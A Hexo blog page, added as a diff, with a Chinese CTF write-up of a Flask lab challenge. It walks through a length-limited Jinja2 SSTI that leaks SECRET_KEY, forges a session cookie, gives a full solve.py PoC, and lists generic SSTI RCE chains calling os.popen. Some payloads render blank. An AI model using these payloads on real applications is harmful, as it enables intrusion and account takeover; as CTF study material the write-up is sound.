@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="用户管理系统 ：Flask &#x2F; Werkzeug 3.1.8 &#x2F; Python 3.11.15Flagmoectf&#123;86ddb09d-28cb-d045-be1a-04f1a81d67ce&#125; 考点 ：Jinja2 SSTI、长度限制绕过思维、   密钥泄露、Flask session cookie 伪造（itsdangerous）、鉴权字段枚举   一、题目">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2026/10/18/moectf-ssti-writeup/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="用户管理系统 ：Flask &#x2F; Werkzeug 3.1.8 &#x2F; Python 3.11.15Flagmoectf&#123;86ddb09d-28cb-d045-be1a-04f1a81d67ce&#125; 考点 ：Jinja2 SSTI、长度限制绕过思维、   密钥泄露、Flask session cookie 伪造（itsdangerous）、鉴权字段枚举   一、题目">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-10-17T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-10-18T02:38:52.120Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="SSTI">
+<meta property="article:tag" content="Flask">
+<meta property="article:tag" content="Jinja2">
+<meta property="article:tag" content="Session伪造">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-moectf-ssti-writeup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/10/18/moectf-ssti-writeup/" class="article-date">
+  <time class="dt-published" datetime="2026-10-17T16:00:00.000Z" itemprop="datePublished">2026-10-18</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>►<a class="article-category-link" href="/categories/CTF/Web/">Web</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="用户管理系统"><a href="#用户管理系统" class="headerlink" title="用户管理系统"></a><em>用户管理系统</em></h2><blockquote>
+<p>：Flask &#x2F; Werkzeug 3.1.8 &#x2F; Python 3.11.15<br><strong>Flag</strong><br><code>moectf&#123;86ddb09d-28cb-d045-be1a-04f1a81d67ce&#125;</code></p>
+<p><strong>考点</strong></p>
+<p>：Jinja2 SSTI、长度限制绕过思维、</p>
+<p><code></code></p>
+<p> 密钥泄露、Flask session cookie 伪造（itsdangerous）、鉴权字段枚举</p>
+</blockquote>
+<hr>
+<h2 id="一、题目概述"><a href="#一、题目概述" class="headerlink" title="一、题目概述"></a>一、题目概述</h2><p>靶机是一个 Flask 编写的「用户管理系统」，只有一个登录页和一个鉴权接口。</p>
+<ul>
+<li><code>GET /</code>：登录页（含 <code>username</code> &#x2F; <code>password</code> 表单，POST 到 <code>/login</code>）</li>
+<li><code>POST /login</code>：处理登录</li>
+<li><code>GET /user</code>：要求登录，未登录返回 <code>401 &#123;&quot;error&quot;:&quot;未登录&quot;&#125;</code><br>登录失败时后端会把 <code>username</code> 拼进模板并渲染，存在 ** Jinja2 服务端模板注入（SSTI）；同时 <code>username</code> 被限长 ** 10 字符**，逼着利用者走「短 payload 泄露密钥 → 伪造会话」而非直接 RCE</li>
+</ul>
+<hr>
+<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:7623</span><br></pre></td></tr></table></figure>
+
+<p>响应头确认技术栈：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Werkzeug/3.1.8 Python/3.11.15</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>Werkzeug</strong> &#x3D; Flask 的 WSGI 服务器，基本锁定 Jinja2 模板引擎</li>
+<li>页面标题「用户管理系统」，表单 <code>POST /login</code>，字段 <code>username</code>、<code>password</code></li>
+</ul>
+<hr>
+<h2 id="三、漏洞发现：SSTI-确认"><a href="#三、漏洞发现：SSTI-确认" class="headerlink" title="三、漏洞发现：SSTI 确认"></a>三、漏洞发现：SSTI 确认</h2><p>向 <code>/login</code> 提交 <code>username=49</code><br>响应错误提示：<br><code>49</code> 被求值成 <code>49</code> 并回显 → <strong>模板表达式可执行，SSTI 确认</strong>。模板结构大致为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render_template_string(f&quot;用户&#123;username&#125;登录失败&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>再注入 <code></code>，能直接看到 Flask 配置对象。</p>
+<hr>
+<h2 id="四、关键限制：username-限长-10-字符"><a href="#四、关键限制：username-限长-10-字符" class="headerlink" title="四、关键限制：username 限长 10 字符"></a>四、关键限制：username 限长 10 字符</h2><p>尝试注入更长的 RCE 链时，服务端返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;error&quot;&gt;&lt;p&gt;The username cannot be too long!&lt;/p&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这提示我们：** 不要硬刚 RCE，改走「短 payload 能做的二次利用」**</p>
+<hr>
+<h2 id="五、密钥泄露："><a href="#五、密钥泄露：" class="headerlink" title="五、密钥泄露："></a>五、密钥泄露：</h2><p><code></code> 恰好 10 字符，注入后完整返回 Flask 配置，其中关键一项：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY = e88d7921a6566694d71a7c6e60a9fda8a4c390705e07a9e919424086d216484d</span><br></pre></td></tr></table></figure>
+
+<p><code>SECRET_KEY</code> 是 Flask 签名会话 cookie 的密钥。拿到它，就能伪造任意合法 session </p>
+<hr>
+<h2 id="六、定位目标：路由枚举与鉴权分析"><a href="#六、定位目标：路由枚举与鉴权分析" class="headerlink" title="六、定位目标：路由枚举与鉴权分析"></a>六、定位目标：路由枚举与鉴权分析</h2><p>对所有可能路径做 fuzz：</p>
+<table>
+<thead>
+<tr>
+<th>路径</th>
+<th>状态</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/</code></td>
+<td>200（登录页）</td>
+</tr>
+<tr>
+<td><code>/login</code></td>
+<td>405（仅 POST）</td>
+</tr>
+<tr>
+<td><code>/user</code></td>
+<td><strong>401</strong>（鉴权接口，返回 <code>&#123;&quot;error&quot;:&quot;未登录&quot;&#125;</code>）</td>
+</tr>
+<tr>
+<td>其余（&#x2F;admin、&#x2F;flag、&#x2F;api&#x2F;* 等）</td>
+<td>404</td>
+</tr>
+<tr>
+<td>**结论：flag 在<code>/user</code>后面，必须先通过鉴权</td>
+<td></td>
+</tr>
+<tr>
+<td>尝试登录爆破（648 组常见账号口令）均失败、且从不返回 <code>Set-Cookie</code> → <strong>登录不是「破口令」的路子</strong>，会话只能靠伪造。</td>
+<td></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="七、核心利用：伪造-Flask-session-cookie"><a href="#七、核心利用：伪造-Flask-session-cookie" class="headerlink" title="七、核心利用：伪造 Flask session cookie"></a>七、核心利用：伪造 Flask session cookie</h2><h3 id="7-1-会话-cookie-格式"><a href="#7-1-会话-cookie-格式" class="headerlink" title="7.1 会话 cookie 格式"></a>7.1 会话 cookie 格式</h3><p>Flask 的 session cookie 由 <code>itsdangerous</code> 的 <code>URLSafeTimedSerializer</code> 生成，结构为<strong>三段</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;urlsafe_b64(payload)&gt;.&lt;timestamp_base36&gt;.&lt;signature&gt;</span><br></pre></td></tr></table></figure>
+
+<p>签名参数（Flask 默认）：</p>
+<ul>
+<li><code>salt = b&quot;flask&quot;</code></li>
+<li><code>key_derivation = &quot;hmac&quot;</code></li>
+<li><code>digest_method = sha1</code></li>
+</ul>
+<h3 id="7-2-用-SECRET-KEY-签名"><a href="#7-2-用-SECRET-KEY-签名" class="headerlink" title="7.2 用 SECRET_KEY 签名"></a>7.2 用 SECRET_KEY 签名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line">SECRET = &quot;e88d7921a6566694d71a7c6e60a9fda8a4c390705e07a9e919424086d216484d&quot;</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = SECRET</span><br><span class="line">serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line">cookie = serializer.dumps(&#123;&quot;token&quot;: &quot;admin&quot;&#125;)</span><br><span class="line">print(cookie)</span><br><span class="line"># eyJ0b2tlbiI6ImFkbWluIn0.atOPgQ.ZOs4OOQWsjhJCr96THwR4-RFjD8</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-3-鉴权字段枚举（本题最坑的点）"><a href="#7-3-鉴权字段枚举（本题最坑的点）" class="headerlink" title="7.3 鉴权字段枚举（本题最坑的点）"></a>7.3 鉴权字段枚举（本题最坑的点）</h3><p>伪造 cookie 打 <code>/user</code> 时，**字段名不是常见的<code>username</code>，而是<code>token</code><br>试过的常见结构全部 401：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;: &quot;admin&quot;&#125;          # 401</span><br><span class="line">&#123;&quot;logged_in&quot;: True&#125;            # 401</span><br><span class="line">&#123;&quot;is_admin&quot;: True, ...&#125;        # 401</span><br><span class="line">&#123;&quot;user&quot;: &quot;admin&quot;&#125;              # 401</span><br></pre></td></tr></table></figure>
+
+<p>命中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;token&quot;: &quot;admin&quot;&#125;             # 200 !!</span><br></pre></td></tr></table></figure>
+
+<p>这提醒我们：** 伪造会话时，字段名与值都要枚举，不能默认<code>username</code> **</p>
+<hr>
+<h2 id="八、Flag"><a href="#八、Flag" class="headerlink" title="八、Flag"></a>八、Flag</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /user HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:7623</span><br><span class="line">Cookie: session=eyJ0b2tlbiI6ImFkbWluIn0.atOPgQ.ZOs4OOQWsjhJCr96THwR4-RFjD8</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">&#123;&quot;info&quot;:&quot;moectf&#123;86ddb09d-28cb-d045-be1a-04f1a81d67ce&#125;&quot;,&quot;username&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Flag</strong> <code>moectf&#123;86ddb09d-28cb-d045-be1a-04f1a81d67ce&#125;</code></p>
+<hr>
+<h2 id="九、完整可复现-PoC"><a href="#九、完整可复现-PoC" class="headerlink" title="九、完整可复现 PoC"></a>九、完整可复现 PoC</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># solve.py</span><br><span class="line">import urllib.request</span><br><span class="line">from flask import Flask</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line">BASE = &quot;[http://127.0.0.1:7623](http://127.0.0.1:7623)&quot;</span><br><span class="line">SECRET = &quot;e88d7921a6566694d71a7c6e60a9fda8a4c390705e07a9e919424086d216484d&quot;</span><br><span class="line"># 1 泄露 SECRET_KEY</span><br><span class="line">#    POST /login  username=&#123;&#123;config&#125;&#125;</span><br><span class="line">#    SECRET_KEY = e88d7921a6566694d71a7c6e60a9fda8a4c390705e07a9e919424086d216484d</span><br><span class="line"># 2 用 SECRET_KEY 伪造 session cookie</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = SECRET</span><br><span class="line">serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line">cookie = serializer.dumps(&#123;&quot;token&quot;: &quot;admin&quot;&#125;)</span><br><span class="line"># 3 带伪造 cookie 访问 /user</span><br><span class="line">req = urllib.request.Request(</span><br><span class="line">    BASE + &quot;/user&quot;,</span><br><span class="line">    headers=&#123;&quot;Cookie&quot;: &quot;session=&quot; + cookie&#125;)</span><br><span class="line">r = urllib.request.urlopen(req, timeout=6)</span><br><span class="line">print(&quot;HTTP&quot;, r.status)</span><br><span class="line">print(r.read().decode(&quot;utf-8&quot;))</span><br><span class="line"># HTTP 200</span><br><span class="line"># &#123;&quot;info&quot;:&quot;moectf&#123;86ddb09d-28cb-d045-be1a-04f1a81d67ce&#125;&quot;,&quot;username&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十、知识点与通用思路沉淀"><a href="#十、知识点与通用思路沉淀" class="headerlink" title="十、知识点与通用思路沉淀"></a>十、知识点与通用思路沉淀</h2><p><strong>SSTI 通用打法：</strong></p>
+<ol>
+<li><strong>探测</strong>：7*7 求值回显 → 确认注入点。</li>
+<li><strong>看上下文</strong>：config,self,g,session,request </li>
+<li><strong>识别限制</strong>：长度 &#x2F; 黑名单会把「直接 RCE」逼成「泄露 → 二次利用」。</li>
+<li><strong>泄露密钥 → 伪造会话</strong>：<code>SECRET_KEY</code> + <code>itsdangerous</code>（<code>salt=b&#39;flask&#39;</code>、hmac、sha1）签 session cookie。</li>
+<li><strong>枚举鉴权点与会话字段</strong>：扫路由找 <code>401</code> 接口；伪造时把 <code>token</code>&#x2F;<code>username</code>&#x2F;<code>uid</code>&#x2F;<code>role</code> 等字段和值一起枚举。</li>
+<li><strong>若确需 RCE</strong>（无长度限制时）标准链：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;id&#x27;).read()&#125;</span><br><span class="line"># 或</span><br><span class="line">&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()&#125;   # 找 Popen</span><br></pre></td></tr></table></figure>
+
+<p><strong>本题题型特征</strong>：「受限 SSTI + Flask 会话伪造」，考点是「长度限制思维 + 密钥泄露 + 会话结构枚举」  </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/10/18/moectf-ssti-writeup/" data-id="cmvd7vmxw000068pf79f2awor" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Flask/" rel="tag">Flask</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Jinja2/" rel="tag">Jinja2</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Session%E4%BC%AA%E9%80%A0/" rel="tag">Session伪造</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2026/10/14/moectf%E5%A4%8D%E7%9B%98/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">moectf复盘</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/Web/">Web</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Flask/" rel="tag">Flask</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Jinja2/" rel="tag">Jinja2</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Session%E4%BC%AA%E9%80%A0/" rel="tag">Session伪造</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%9B%98/" rel="tag">复盘</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Flask/" style="font-size: 10px;">Flask</a> <a href="/tags/Jinja2/" style="font-size: 10px;">Jinja2</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 10px;">SSTI</a> <a href="/tags/Session%E4%BC%AA%E9%80%A0/" style="font-size: 10px;">Session伪造</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 20px;">Web安全</a> <a href="/tags/%E5%A4%8D%E7%9B%98/" style="font-size: 10px;">复盘</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/10/">October 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/09/">September 2026</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2026/10/18/moectf-ssti-writeup/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2026/10/14/moectf%E5%A4%8D%E7%9B%98/">moectf复盘</a>
+          </li>
+        
+          <li>
+            <a href="/2026/10/13/%E5%85%B3%E4%BA%8E%E5%AF%86%E7%A0%81%E5%AD%A6/">关于密码学</a>
+          </li>
+        
+          <li>
+            <a href="/2026/10/13/%E5%85%B3%E4%BA%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">关于渗透测试</a>
+          </li>
+        
+          <li>
+            <a href="/2026/10/11/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">MoeCTF 2026「熊出没」题解复盘</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
